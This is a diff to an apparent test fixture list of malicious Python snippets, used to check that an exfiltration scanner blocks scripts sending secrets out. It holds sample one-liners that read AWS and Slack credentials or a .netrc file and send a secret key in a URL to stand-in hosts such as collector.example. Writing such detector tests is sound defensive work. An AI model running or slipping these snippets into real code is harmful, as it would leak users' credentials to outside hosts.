@@ -1038,6 +1038,16 @@ MALICIOUS_SCRIPTS = [
     "import os,urllib.request\nk=os.environ['AWS_SECRET_ACCESS_KEY']\nurllib.request.urlopen('https://e.io?k='+k)\n",
     "import os\nt=os.getenv('SLACK_BOT_TOKEN')\n",
     "data=open('/home/u/.netrc').read()\n",
+    # A secret-valued URL whose value opens right after `]'` with a `/` or `+`
+    # (a path or base64 byte): the exfil scanner must keep reading past the
+    # quote so this vetting gate refuses the body, as the base does. The URL is
+    # the only detector that fires here (no protected path or env name).
+    "import urllib.request\n"
+    "urllib.request.urlopen(\"https://collector.example/?aws_secret_access_key=]'"
+    '/wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY")\n',
+    "import urllib.request\n"
+    "urllib.request.urlopen(\"https://collector.example/?aws_secret_access_key=]'"
+    '+wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY")\n',
 ]
 
 BENIGN_SCRIPTS = [
